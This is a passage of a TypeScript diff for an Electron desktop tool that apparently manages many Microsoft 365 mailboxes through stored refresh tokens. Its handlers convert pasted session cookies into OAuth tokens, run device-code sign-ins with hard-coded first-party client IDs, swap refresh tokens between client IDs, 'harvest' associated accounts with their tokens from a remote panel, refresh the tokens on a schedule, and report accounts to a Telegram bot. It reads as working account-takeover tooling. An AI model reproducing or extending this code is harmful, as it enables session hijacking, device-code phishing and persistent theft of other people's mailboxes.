+  return { success: false, error: lastErr };
+}
+
+function logTelegramFailure(context: string, err: string): void {
+  const safe = String(err).replace(/bot\d+:[A-Za-z0-9_-]+/gi, 'bot<redacted>');
+  console.warn(`[Telegram:${context}]`, safe.substring(0, 300));
+}
+
+async function sendAccountsTelegramNotification(store: Record<string, any>, htmlBody: string): Promise<void> {
+  const cfg = store.settings?.telegram?.accounts;
+  if (!cfg?.enabled || !cfg?.token || !cfg?.chatId) return;
+  const result = await telegramSendWithRetry(cfg.token, cfg.chatId, htmlBody, 'HTML');
+  if (!result.success) logTelegramFailure('accounts', result.error || 'failed');
+}
+
+// --------------------------
+// Error handling
+// --------------------------
+process.on('uncaughtException', (error) => {
+  console.error('[Main] Uncaught Exception:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('[Main] Unhandled Rejection at:', promise, 'reason:', reason);
+});
+
+// --------------------------
+// URL normalization (same as renderer/utils/url)
+// --------------------------
+function normalizePanelUrl(url: string): string {
+  let normalized = url.trim();
+  if (!normalized.startsWith('http://') && !normalized.startsWith('https://')) {
+    normalized = 'https://' + normalized;
+  }
+  // Remove trailing slash
+  normalized = normalized.replace(/\/$/, '');
+  return normalized;
+}
+
+// --------------------------
+// Single instance lock
+// --------------------------
+const multiInstanceForTests = process.env.ALLOW_MULTI_INSTANCE === '1';
+const gotLock = multiInstanceForTests ? true : app.requestSingleInstanceLock();
+if (!gotLock) {
+  console.log('[Main] Another instance is already running, quitting...');
+  app.quit();
+  process.exit(0);
+}
+
+let mainWindow: BrowserWindow | null = null;
+const isDev = process.env.NODE_ENV === 'development';
+
+// Focus main window on second instance
+app.on('second-instance', () => {
+  if (mainWindow) {
+    if (mainWindow.isMinimized()) mainWindow.restore();
+    mainWindow.focus();
+  }
+});
+
+// --------------------------
+// Simple file-based store
+// --------------------------
+const userDataPath = app.getPath('userData');
+const storePath = path.join(userDataPath, 'store.json');
+const statePath = path.join(userDataPath, 'state.json');
+
+// UI state schema imported from '../types/state'
+
+async function ensureStateFile() {
+  try {
+    await fs.access(statePath);
+  } catch {
+    await fs.mkdir(userDataPath, { recursive: true });
+    await fs.writeFile(statePath, JSON.stringify(DEFAULT_STATE, null, 2), 'utf-8');
+  }
+}
+
+async function readStore(): Promise<Record<string, any>> {
+  try {
+    const data = await fs.readFile(storePath, 'utf-8');
+    return JSON.parse(data);
+  } catch (err) {
+    return {};
+  }
+}
+
+async function writeStore(data: Record<string, any>) {
+  await fs.mkdir(userDataPath, { recursive: true });
+  await fs.writeFile(storePath, JSON.stringify(data, null, 2), 'utf-8');
+}
+
+const LOCAL_DEV_ACCOUNT_FILE = 'local-dev-account.json';
+
+/** Dev-only: load gitignored JSON next to the project (or next to compiled main) and upsert a token account. */
+async function seedDevAccountFromLocalFile(): Promise<void> {
+  if (app.isPackaged) return;
+
+  const candidates = [
+    path.join(process.cwd(), LOCAL_DEV_ACCOUNT_FILE),
+    path.join(__dirname, '../../../local-dev-account.json'),
+  ];
+
+  let raw: string | null = null;
+  let usedPath: string | null = null;
+  for (const p of candidates) {
+    try {
+      raw = await fs.readFile(p, 'utf-8');
+      usedPath = p;
+      break;
+    } catch {
+      /* try next */
+    }
+  }
+  if (!raw || !usedPath) return;
+
+  let data: any;
+  try {
+    data = JSON.parse(raw);
+  } catch (e) {
+    console.warn('[DevSeed] Invalid JSON in', LOCAL_DEV_ACCOUNT_FILE, e);
+    return;
+  }
+
+  const email = String(data.email || '').trim();
+  if (!email) {
+    console.warn('[DevSeed] Missing email in', usedPath);
+    return;
+  }
+
+  let refreshToken: string | undefined;
+  let clientId: string | undefined;
+  let authorityEndpoint: string | undefined;
+  let scopeType: string | undefined;
+  let resource: string | undefined;
+  const name = (data.name || data.display_name || email.split('@')[0]) as string;
+
+  if (data.token && typeof data.token === 'object') {
+    refreshToken = data.token.refresh_token || data.token.refreshToken;
+    const scopeStr = typeof data.token.scope === 'string' ? data.token.scope : '';
+    if (scopeStr.includes('https://outlook.office.com')) {
+      resource = 'https://outlook.office.com';
+    }
+  }
+  refreshToken = refreshToken || data.refreshToken || data.refresh_token;
+  clientId = data.clientId || data.client_id;
+  authorityEndpoint = data.authorityEndpoint || data.authority_endpoint;
+  scopeType = data.scopeType || data.scope_type || 'ews';
+  resource = data.resource || resource || 'https://outlook.office.com';
+
+  if (!clientId) clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+  if (!authorityEndpoint) authorityEndpoint = 'cf404960-c50f-46d2-8bf3-a3c957283b86';
+
+  const rt = String(refreshToken || '').trim();
+  if (!rt || /PASTE|REPLACE|YOUR_|HERE/i.test(rt)) {
+    console.warn(
+      '[DevSeed] Add a real refresh_token to',
+      usedPath,
+      '(see local-dev-account.example.json). Skipping seed.'
+    );
+    return;
+  }
+
+  const store = await readStore();
+  const accounts: any[] = store.accounts || [];
+  const existing = accounts.find((a: any) => String(a.email || '').toLowerCase() === email.toLowerCase());
+  const auth = {
+    type: 'token' as const,
+    clientId,
+    authorityEndpoint,
+    refreshToken: rt,
+    scopeType,
+    resource,
+  };
+
+  if (existing) {
+    console.log('[DevSeed] Updating existing account auth for', email);
+    existing.auth = auth;
+    existing.status = 'active';
+    existing.name = name;
+  } else {
+    accounts.push({
+      id: crypto.randomUUID(),
+      email,
+      name,
+      added: new Date().toISOString(),
+      status: 'active',
+      tags: ['dev-seed'],
+      auth,
+    });
+    store.accounts = accounts;
+  }
+
+  await writeStore(store);
+  console.log('[DevSeed] Loaded account from', usedPath, '→', email);
+}
+
+// --------------------------
+// State persistence
+// --------------------------
+async function readState(): Promise<AppState> {
+  try {
+    const data = await fs.readFile(statePath, 'utf-8');
+    const parsed = JSON.parse(data);
+    // Merge with defaults for missing fields
+    return { ...DEFAULT_STATE, ...parsed };
+  } catch (err) {
+    return DEFAULT_STATE;
+  }
+}
+
+async function writeState(state: AppState) {
+  await fs.mkdir(userDataPath, { recursive: true });
+  await fs.writeFile(statePath, JSON.stringify(state, null, 2), 'utf-8');
+}
+
+// --------------------------
+// Session validity check (HEAD request for each account)
+// --------------------------
+async function checkSessionValidity(): Promise<void> {
+  console.log('[Session] Starting session validity check');
+  try {
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    const panels: any[] = store.panels || [];
+    console.log(`[Session] Checking ${accounts.length} accounts, ${panels.length} panels`);
+
+    for (const account of accounts) {
+      const panel = panels.find(p => p.id === account.panelId);
+      if (!panel || !panel.token) {
+        console.log(`[Session] Account ${account.email} - no panel or token, marking expired`);
+        account.status = 'expired';
+        continue;
+      }
+      // Lightweight HEAD request to panel API to verify token
+      try {
+        console.log(`[Session] Checking ${account.email} via panel ${panel.name} (${panel.url})`);
+        // Polyfill for AbortSignal.timeout
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+        try {
+          const response = await fetch(`${panel.url}/api/admin/accounts`, {
+            method: 'HEAD',
+            headers: { Authorization: `Bearer ${panel.token}` },
+            signal: controller.signal,
+          } as any);
+          clearTimeout(timeoutId);
+          account.status = response.ok ? 'active' : 'expired';
+        } catch (err) {
+          clearTimeout(timeoutId);
+          throw err;
+        }
+        console.log(`[Session] Account ${account.email} status: ${account.status}`);
+      } catch (err) {
+        console.error(`[Session] Error checking ${account.email}:`, err);
+        account.status = 'expired';
+      }
+    }
+    // Update store with new statuses
+    store.accounts = accounts;
+    await writeStore(store);
+    console.log('[Session] Session validity check completed');
+  } catch (err) {
+    console.error('Session validity check failed:', err);
+  }
+}
+
+async function exchangeV1ForV2Token(
+  clientId: string,
+  authority: string,
+  refreshToken: string,
+  resource?: string
+): Promise<{ accessToken: string; refreshToken: string; expiresIn: number; tokenType: string; idToken?: string }> {
+  const tenant = normalizeAuthorityTenant(authority);
+  const endpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), 30000);
+  try {
+    const scope = resource === 'https://graph.microsoft.com' ? 'https://graph.microsoft.com/.default openid profile offline_access' : 'https://outlook.office.com/.default openid profile offline_access';
+    console.log('[Microsoft] V2 token exchange scope:', scope, 'resource:', resource);
+    const bodyParams = new URLSearchParams({
+      grant_type: 'refresh_token',
+      refresh_token: refreshToken,
+      client_id: clientId,
+      scope,
+    });
+    const response = await fetch(endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: bodyParams,
+      signal: controller.signal,
+    } as any);
+    clearTimeout(timeoutId);
+    if (!response.ok) {
+      const data = await response.json().catch(() => ({}));
+      if (data.error === 'invalid_grant') {
+        const err = new Error('REFRESH_TOKEN_EXPIRED');
+        (err as any).code = 'REFRESH_TOKEN_EXPIRED';
+        throw err;
+      }
+      throw new Error(`V2 token exchange failed: ${data.error_description || response.status}`);
+    }
+    const data = await response.json();
+    console.log('[Microsoft] V2 token exchange succeeded', { 
+      expires_in: data.expires_in, 
+      has_id_token: !!data.id_token,
+      scope: data.scope,
+    });
+    return {
+      accessToken: data.access_token,
+      refreshToken: data.refresh_token || refreshToken,
+      expiresIn: data.expires_in,
+      tokenType: data.token_type || 'Bearer',
+      idToken: data.id_token,
+    };
+  } catch (error: any) {
+    clearTimeout(timeoutId);
+    if (error.code) throw error;
+    throw error;
+  }
+}
+
+async function refreshAllTokens(): Promise<{
+  success: number;
+  expired: number;
+  failed: number;
+  errors: Array<{ accountId: string; error: string }>;
+}> {
+  try {
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    const tokenAccounts = accounts.filter(a => a.auth?.type === 'token' && a.status === 'active');
+    const results = { success: 0, expired: 0, failed: 0, errors: [] as Array<{ accountId: string; error: string }> };
+    // Process in batches to avoid rate limits
+    const batchSize = 5;
+    for (let i = 0; i < tokenAccounts.length; i += batchSize) {
+      const batch = tokenAccounts.slice(i, i + batchSize);
+      const promises = batch.map(async (account) => {
+        try {
+          const { clientId, authorityEndpoint, refreshToken } = account.auth;
+          if (!clientId || !authorityEndpoint || !refreshToken) {
+            results.failed++;
+            results.errors.push({ accountId: account.id, error: 'Missing auth fields' });
+            return;
+          }
+          const scopeType = account.auth.scopeType || 'ews';
+          const resource = account.auth.resource;
+          const result = await refreshMicrosoftToken(
+            clientId,
+            authorityEndpoint,
+            refreshToken,
+            scopeType,
+            resource || '00000002-0000-0ff1-ce00-000000000000'
+          );
+          account.auth.refreshToken = result.refreshToken;
+          account.auth.scopeType = scopeType;
+          account.lastRefresh = new Date().toISOString();
+          account.status = 'active';
+          results.success++;
+        } catch (error: any) {
+          if (error.code === 'REFRESH_TOKEN_EXPIRED') {
+            account.status = 'expired';
+            account.lastRefresh = new Date().toISOString();
+            results.expired++;
+          } else {
+            results.failed++;
+            results.errors.push({ accountId: account.id, error: error.message || 'Unknown' });
+          }
+        }
+      });
+      await Promise.all(promises);
+      // Delay between batches (10 seconds)
+      if (i + batchSize < tokenAccounts.length) {
+        await new Promise(resolve => setTimeout(resolve, 10000));
+      }
+    }
+    // Save updated store
+    await writeStore(store);
+    return results;
+  } catch (error: any) {
+    console.error('refreshAllTokens failed:', error);
+    return { success: 0, expired: 0, failed: 0, errors: [{ accountId: '', error: error.message }] };
+  }
+}
+
+let tokenRefreshIntervalId: NodeJS.Timeout | null = null;
+
+async function startTokenRefreshScheduler() {
+  // Clear existing interval
+  if (tokenRefreshIntervalId) {
+    clearInterval(tokenRefreshIntervalId);
+    tokenRefreshIntervalId = null;
+  }
+  // Read interval from settings (default 45 minutes)
+  const store = await readStore();
+  const intervalMinutes = store.settings?.refresh?.intervalMinutes || 45;
+  if (intervalMinutes <= 0) {
+    console.log('Token refresh scheduler disabled (interval <= 0)');
+    return;
+  }
+  console.log(`Starting token refresh scheduler, interval: ${intervalMinutes} minutes`);
+  // Run first refresh after 1 minute
+  setTimeout(() => {
+    refreshAllTokens().then(results => {
+      console.log(`Initial token refresh completed: ${results.success} succeeded, ${results.expired} expired, ${results.failed} failed`);
+    });
+  }, 60000);
+  // Schedule periodic refreshes
+  const intervalMs = intervalMinutes * 60 * 1000;
+  tokenRefreshIntervalId = setInterval(() => {
+    refreshAllTokens().then(results => {
+      console.log(`Periodic token refresh completed: ${results.success} succeeded, ${results.expired} expired, ${results.failed} failed`);
+    });
+  }, intervalMs);
+}
+
+function stopTokenRefreshScheduler() {
+  if (tokenRefreshIntervalId) {
+    clearInterval(tokenRefreshIntervalId);
+    tokenRefreshIntervalId = null;
+    console.log('Token refresh scheduler stopped');
+  }
+}
+
+// --------------------------
+// IPC Handlers
+// --------------------------
+function setupIpcHandlers() {
+  // Store
+  ipcMain.handle('store:get', async (_, key: string) => {
+    const store = await readStore();
+    return store[key];
+  });
+
+  ipcMain.handle('store:set', async (_, key: string, value: any) => {
+    const store = await readStore();
+    store[key] = value;
+    await writeStore(store);
+    return true;
+  });
+
+  ipcMain.handle('store:delete', async (_, key: string) => {
+    const store = await readStore();
+    delete store[key];
+    await writeStore(store);
+    return true;
+  });
+
+  // State
+  ipcMain.handle('state:get', async () => {
+    return await readState();
+  });
+
+  ipcMain.handle('state:set', async (_, state: AppState) => {
+    await writeState(state);
+    return true;
+  });
+
+  ipcMain.handle('state:update', async (_, updates: Partial<AppState>) => {
+    const current = await readState();
+    const updated = { ...current, ...updates };
+    await writeState(updated);
+    return updated;
+  });
+
+  // SafeStorage encryption (only works when encryption is available)
+  ipcMain.handle('safeStorage:encrypt', (_, plaintext: string) => {
+    if (!safeStorage.isEncryptionAvailable()) {
+      throw new Error('Encryption not available');
+    }
+    const buffer = safeStorage.encryptString(plaintext);
+    return buffer.toString('base64');
+  });
+
+  ipcMain.handle('safeStorage:decrypt', (_, ciphertextBase64: string) => {
+    if (!safeStorage.isEncryptionAvailable()) {
+      throw new Error('Encryption not available');
+    }
+    const buffer = Buffer.from(ciphertextBase64, 'base64');
+    return safeStorage.decryptString(buffer);
+  });
+
+  // Proxy API requests (bypass CORS)
+  ipcMain.handle('api:request', async (_, options) => {
+    const { url, method = 'GET', headers = {}, body, timeoutMs } = options as {
+      url: string;
+      method?: string;
+      headers?: Record<string, string>;
+      body?: any;
+      timeoutMs?: number;
+    };
+    const ms = typeof timeoutMs === 'number' && timeoutMs > 0 ? Math.min(timeoutMs, 120000) : 15000;
+    let response: Response;
+    try {
+      response = await fetch(url, {
+        method,
+        headers: { 'Content-Type': 'application/json', ...headers },
+        body: body ? JSON.stringify(body) : undefined,
+        signal: timeoutSignal(ms),
+      } as any);
+    } catch (err: any) {
+      const msg = err?.cause?.message || err?.message || String(err);
+      throw new Error(`Cannot reach ${url}. Check the panel URL is correct and the server is running. (${msg})`);
+    }
+    const text = await response.text();
+    let data: any;
+    try { data = JSON.parse(text); } catch { data = text; }
+    return {
+      ok: response.ok,
+      status: response.status,
+      headers: Object.fromEntries(response.headers.entries()),
+      data,
+    };
+  });
+
+  // Cookie capture (open a browser window to capture cookies)
+  ipcMain.handle('cookies:capture', async (_, url: string) => {
+    console.log('Cookie capture requested for', url);
+    return new Promise((resolve, reject) => {
+      let captureWindow: BrowserWindow | null = null;
+      const parsedUrl = new URL(url);
+      const domain = parsedUrl.hostname;
+
+      // Create a browser window (not hidden, so user can log in)
+      captureWindow = new BrowserWindow({
+        width: 800,
+        height: 600,
+        show: true,
+        title: `Cookie Capture - ${domain}`,
+        webPreferences: {
+          nodeIntegration: false,
+          contextIsolation: true,
+          partition: `capture-${Date.now()}`,
+        },
+      });
+
+      // Capture cookies after page loads and a short delay
+      let captured = false;
+      let autoCaptureTimer: NodeJS.Timeout | null = null;
+      let loadCaptureTimer: NodeJS.Timeout | null = null;
+
+      const cleanup = () => {
+        if (autoCaptureTimer) clearTimeout(autoCaptureTimer);
+        if (loadCaptureTimer) clearTimeout(loadCaptureTimer);
+        autoCaptureTimer = null;
+        loadCaptureTimer = null;
+      };
+
+      const capture = () => {
+        if (captured) return;
+        captured = true;
+        cleanup(); // clear pending timers
+        const ses = captureWindow?.webContents.session;
+        ses?.cookies.get({ domain })
+          .then(cookies => {
+            const cookieStrings = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+            // Close window
+            if (captureWindow && !captureWindow.isDestroyed()) {
+              captureWindow.close();
+              captureWindow = null;
+            }
+            resolve({ success: true, cookies: cookieStrings, message: 'Cookies captured' });
+          })
+          .catch(err => {
+            if (captureWindow && !captureWindow.isDestroyed()) captureWindow.close();
+            reject(new Error(`Failed to get cookies: ${err.message}`));
+          });
+      };
+
+      // Capture after 3 minutes automatically (allow user time to log in)
+      autoCaptureTimer = setTimeout(capture, 180000);
+
+      // Also capture when page finishes loading (but wait a bit more)
+      captureWindow.webContents.on('did-finish-load', () => {
+        if (loadCaptureTimer) clearTimeout(loadCaptureTimer);
+        loadCaptureTimer = setTimeout(capture, 2000); // extra 2 seconds after load
+      });
+
+      // If user closes window before capture, reject
+      captureWindow.on('closed', () => {
+        captureWindow = null;
+        if (!captured) {
+          cleanup();
+          reject(new Error('Cookie capture window closed by user'));
+        }
+      });
+
+      // Navigate to the URL
+      captureWindow.loadURL(url).catch(err => {
+        cleanup();
+        if (captureWindow && !captureWindow.isDestroyed()) captureWindow.close();
+        reject(new Error(`Failed to load URL: ${err.message}`));
+      });
+    });
+  });
+
+  // Cookie → token: apply cookies + OAuth authorize (PKCE) + capture code + token exchange
+  ipcMain.handle(
+    'cookies:exchangeToken',
+    async (
+      _,
+      cookiesRaw: string,
+      email?: string,
+      opts?: { clientId?: string; authority?: string; redirectUri?: string; showWindow?: boolean }
+    ) => {
+      console.log('[CookieExchange] Starting for', email || 'unknown', 'paste length', cookiesRaw?.length ?? 0);
+      try {
+        const store = await readStore();
+        const settings = store.settings || {};
+        const ms = settings.microsoftOAuth || {};
+        const clientId =
+          (opts?.clientId && opts.clientId.trim()) ||
+          (typeof ms.clientId === 'string' && ms.clientId.trim()) ||
+          'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+        const authority =
+          (opts?.authority && opts.authority.trim()) ||
+          (typeof ms.tenantId === 'string' && ms.tenantId.trim()) ||
+          'common';
+        const redirectUri =
+          (opts?.redirectUri && opts.redirectUri.trim()) ||
+          (typeof ms.redirectUri === 'string' && ms.redirectUri.trim()) ||
+          'https://outlook.office.com/mail/';
+        const showWindow = opts?.showWindow !== false;
+        return await runCookieToTokenConversion({
+          rawPaste: cookiesRaw,
+          emailHint: email,
+          clientId,
+          authority,
+          redirectUri,
+          showWindow,
+        });
+      } catch (error: any) {
+        console.error('[CookieExchange] failed:', error);
+        return {
+          success: false,
+          error: error?.message || 'Unknown error during token exchange',
+        };
+      }
+    }
+  );
+
+  // Device code flow for EWS-scoped tokens (direct, no panel)
+  ipcMain.handle('oauth:deviceCode', async (_, clientId?: string, authority?: string) => {
+    console.log('[OAuth] Starting device code flow for EWS scope');
+    
+    const useClientId = clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const useAuthority = authority || 'common';
+    const ewsScope = 'https://outlook.office.com/EWS.AccessAsUser.All offline_access';
+    
+    try {
+      // Generate device code
+      const deviceCodeResponse = await fetch(`https://login.microsoftonline.com/${useAuthority}/oauth2/v2.0/devicecode`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          client_id: useClientId,
+          scope: ewsScope,
+          prompt: 'consent'  // Show permissions screen clearly
+        }),
+        signal: timeoutSignal(15000),
+      } as any);
+      
+      if (!deviceCodeResponse.ok) {
+        const error = await deviceCodeResponse.json();
+        throw new Error(`Device code request failed: ${error.error_description || deviceCodeResponse.status}`);
+      }
+      
+      const deviceCodeData = await deviceCodeResponse.json();
+      
+      // Fix verification URI (microsoft.com/devicelogin)
+      let verificationUri = deviceCodeData.verification_uri;
+      verificationUri = verificationUri.replace('login.microsoft.com/device', 'microsoft.com/devicelogin');
+      
+      console.log('[OAuth] Device code generated');
+      return {
+        success: true,
+        userCode: deviceCodeData.user_code,
+        deviceCode: deviceCodeData.device_code,
+        verificationUri,
+        expiresIn: deviceCodeData.expires_in,
+        interval: deviceCodeData.interval,
+        message: deviceCodeData.message,
+        scope: ewsScope
+      };
+    } catch (error: any) {
+      console.error('[OAuth] Device code generation failed:', error);
+      return {
+        success: false,
+        error: error.message || 'Device code generation failed'
+      };
+    }
+  });
+
+  // Poll for token from device code
+  ipcMain.handle('oauth:pollToken', async (_, deviceCode: string, clientId?: string, authority?: string) => {
+    console.log('[OAuth] Polling for token');
+    
+    const useClientId = clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const useAuthority = authority || 'common';
+    
+    try {
+      const tokenResponse = await fetch(`https://login.microsoftonline.com/${useAuthority}/oauth2/v2.0/token`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
+          device_code: deviceCode,
+          client_id: useClientId
+        }),
+        signal: timeoutSignal(30000),
+      } as any);
+      
+      if (!tokenResponse.ok) {
+        const error = await tokenResponse.json();
+        if (error.error === 'authorization_pending') {
+          return {
+            success: false,
+            pending: true,
+            error: 'authorization_pending',
+            message: 'User has not yet completed authorization'
+          };
+        }
+        if (error.error === 'slow_down') {
+          return {
+            success: false,
+            slowDown: true,
+            error: 'slow_down',
+            message: 'Polling too fast, slow down'
+          };
+        }
+        if (error.error === 'expired_token') {
+          return {
+            success: false,
+            expired: true,
+            error: 'expired_token',
+            message: 'Device code expired'
+          };
+        }
+        throw new Error(`Token poll failed: ${error.error_description || tokenResponse.status}`);
+      }
+      
+      const tokenData = await tokenResponse.json();
+      
+      console.log('[OAuth] Token obtained successfully');
+      console.log('[OAuth] Token keys:', Object.keys(tokenData));
+      console.log('[OAuth] Has refresh_token:', !!tokenData.refresh_token);
+      console.log('[OAuth] Has id_token:', !!tokenData.id_token);
+      console.log('[OAuth] Scope:', tokenData.scope);
+      
+      // Determine appropriate default scope based on client ID
+      let defaultScope = 'https://outlook.office.com/EWS.AccessAsUser.All offline_access';
+      if (useClientId === '9199bf20-a13f-4107-85dc-02114787ef48') {
+        defaultScope = 'https://outlook.office.com/.default openid profile offline_access';
+      }
+      
+      return {
+        success: true,
+        accessToken: tokenData.access_token,
+        refreshToken: tokenData.refresh_token,
+        idToken: tokenData.id_token,
+        expiresIn: tokenData.expires_in,
+        tokenType: tokenData.token_type || 'Bearer',
+        scope: tokenData.scope || defaultScope
+      };
+    } catch (error: any) {
+      console.error('[OAuth] Token poll failed:', error);
+      return {
+        success: false,
+        error: error.message || 'Token poll failed'
+      };
+    }
+  });
+
+  // Test token exchange: attempt to acquire v2‑Graph token using HighHopes client ID
+  ipcMain.handle('test:tokenExchange', async (_, accountId: string) => {
+    console.log('[TokenExchange] Testing v1‑>v2 token exchange for account', accountId);
+    try {
+      const store = await readStore();
+      const accounts: any[] = store.accounts || [];
+      const account = accounts.find(a => a.id === accountId);
+      if (!account) throw new Error('Account not found');
+      if (account.auth?.type !== 'token') throw new Error('Account does not have token auth');
+      
+      const { refreshToken, authorityEndpoint } = account.auth;
+      if (!refreshToken) throw new Error('No refresh token available');
+      
+      const highHopesClientId = '9199bf20-a13f-4107-85dc-02114787ef48';
+      const authority = authorityEndpoint || 'common';
+      const v2Scopes = 'https://outlook.office.com/.default openid profile offline_access';
+      
+      console.log('[TokenExchange] Attempting exchange with client ID', highHopesClientId.substring(0, 8), '...');
+      
+      const endpoint = `https://login.microsoftonline.com/${authority}/oauth2/v2.0/token`;
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 30000);
+      
+      try {
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            grant_type: 'refresh_token',
+            refresh_token: refreshToken,
+            client_id: highHopesClientId,
+            scope: v2Scopes,
+          }),
+          signal: controller.signal,
+        } as any);
+        clearTimeout(timeoutId);
+        
+        if (!response.ok) {
+          const data = await response.json().catch(() => ({}));
+          console.log('[TokenExchange] Exchange failed:', data);
+          return {
+            success: false,
+            error: data.error || 'exchange_failed',
+            errorDescription: data.error_description || `HTTP ${response.status}`,
+          };
+        }
+        
+        const data = await response.json();
+        console.log('[TokenExchange] Exchange succeeded!');
+        console.log('[TokenExchange] Keys returned:', Object.keys(data));
+        console.log('[TokenExchange] Has id_token:', !!data.id_token);
+        
+        return {
+          success: true,
+          accessToken: data.access_token,
+          refreshToken: data.refresh_token,
+          idToken: data.id_token,
+          expiresIn: data.expires_in,
+          tokenType: data.token_type || 'Bearer',
+          scope: data.scope,
+        };
+      } catch (err: any) {
+        clearTimeout(timeoutId);
+        throw err;
+      }
+    } catch (error: any) {
+      console.error('[TokenExchange] Exchange test failed:', error);
+      return {
+        success: false,
+        error: 'exchange_test_failed',
+        errorDescription: error.message || 'Unknown error',
+      };
+    }
+  });
+
+  // Test device‑code flow with HighHopes client ID
+  ipcMain.handle('test:deviceCodeHighHopes', async () => {
+    console.log('[DeviceCodeTest] Testing device‑code flow with HighHopes client ID');
+    const clientId = '9199bf20-a13f-4107-85dc-02114787ef48';
+    const authority = 'common';
+    const scopes = 'https://outlook.office.com/.default openid profile offline_access';
+    
+    try {
+      const response = await fetch(`https://login.microsoftonline.com/${authority}/oauth2/v2.0/devicecode`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          client_id: clientId,
+          scope: scopes,
+          prompt: 'consent'
+        }),
+        signal: timeoutSignal(15000),
+      } as any);
+      
+      if (!response.ok) {
+        const error = await response.json();
+        console.log('[DeviceCodeTest] Device code request failed:', error);
+        return {
+          success: false,
+          error: error.error || 'devicecode_failed',
+          errorDescription: error.error_description || `HTTP ${response.status}`,
+        };
+      }
+      
+      const data = await response.json();
+      console.log('[DeviceCodeTest] Device code generated successfully');
+      // Don't return full data (contains user_code etc.) to avoid accidental exposure
+      return {
+        success: true,
+        clientId: clientId.substring(0, 8) + '...',
+        verificationUri: data.verification_uri?.replace('login.microsoft.com/device', 'microsoft.com/devicelogin'),
+        message: data.message?.substring(0, 100),
+      };
+    } catch (error: any) {
+      console.error('[DeviceCodeTest] Device code test failed:', error);
+      return {
+        success: false,
+        error: 'devicecode_test_failed',
+        errorDescription: error.message || 'Unknown error',
+      };
+    }
+  });
+
+  // Device‑code flow with HighHopes client ID (v2 scopes for OWA)
+  ipcMain.handle('oauth:deviceCodeHighHopes', async () => {
+    console.log('[OAuth] Starting device‑code flow for HighHopes client ID (v2 scopes)');
+    const clientId = '9199bf20-a13f-4107-85dc-02114787ef48';
+    const authority = 'common';
+    const scopes = 'https://outlook.office.com/.default openid profile offline_access';
+    
+    try {
+      const response = await fetch(`https://login.microsoftonline.com/${authority}/oauth2/v2.0/devicecode`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          client_id: clientId,
+          scope: scopes,
+          prompt: 'consent'
+        }),
+        signal: timeoutSignal(15000),
+      } as any);
+      
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(`Device code request failed: ${error.error_description || response.status}`);
+      }
+      
+      const data = await response.json();
+      // Fix verification URI
+      let verificationUri = data.verification_uri;
+      verificationUri = verificationUri.replace('login.microsoft.com/device', 'microsoft.com/devicelogin');
+      
+      console.log('[OAuth] HighHopes device code generated');
+      return {
+        success: true,
+        userCode: data.user_code,
+        deviceCode: data.device_code,
+        verificationUri,
+        expiresIn: data.expires_in,
+        interval: data.interval,
+        message: data.message,
+        scope: scopes,
+        clientId,
+      };
+    } catch (error: any) {
+      console.error('[OAuth] HighHopes device code generation failed:', error);
+      return {
+        success: false,
+        error: error.message || 'Device code generation failed'
+      };
+    }
+  });
+
+  // Admin harvest (fetch associated accounts from admin console)
+  ipcMain.handle('admin:harvest', async (_, accountId: string) => {
+    console.log('Admin harvest requested for account', accountId);
+    try {
+      const store = await readStore();
+      const accounts: any[] = store.accounts || [];
+      const panels: any[] = store.panels || [];
+      const account = accounts.find(a => a.id === accountId);
+      if (!account) throw new Error('Account not found');
+      const panel = panels.find(p => p.id === account.panelId);
+      if (!panel) throw new Error('Panel not found');
+      if (!panel.token) throw new Error('Panel not authenticated');
+
+      // Call panel API endpoint for associated accounts
+      const endpoint = `${panel.url}/api/admin/associated-accounts`;
+      const response = await fetch(endpoint, {
+        method: 'GET',
+        headers: {
+          'Authorization': `Bearer ${panel.token}`,
+          'Content-Type': 'application/json',
+        },
+        signal: timeoutSignal(15000),
+      } as any);
+      if (!response.ok) {
+        throw new Error(`Panel API returned ${response.status}: ${await response.text()}`);
+      }
+      const data = await response.json();
+      // Assume data.accounts is an array of account objects with email, auth, etc.
+      const associated = data.accounts || [];
+      // Transform to expected format
+      const result = associated.map((acc: any) => ({
+        email: acc.email,
+        panelId: panel.id,
+        status: acc.status || 'active',
+        auth: acc.auth || { type: 'token', clientId: acc.clientId, authorityEndpoint: acc.authorityEndpoint, refreshToken: acc.refreshToken },
+      }));
+      return result;
+    } catch (error) {
+      console.error('Admin harvest failed:', error);
+      // Return empty array as fallback (could also re-throw)
+      return [];
+    }
+  });
+
+  // Open mailbox in browser
+  ipcMain.handle('mailbox:open', async (_, accountId: string) => {
+    console.log('Open mailbox for account', accountId);
+    try {
+      const store = await readStore();
+      const accounts: any[] = store.accounts || [];
+      const panels: any[] = store.panels || [];
+      const account = accounts.find(a => a.id === accountId);
+      if (!account) throw new Error('Account not found');
+      const panel = panels.find(p => p.id === account.panelId);
+      if (!panel) throw new Error('Panel not found');
+      if (!panel.token) throw new Error('Panel not authenticated');
+
+      // Construct mailbox URL (admin panel mailbox page)
+      const baseUrl = panel.url.replace(/\/$/, '');
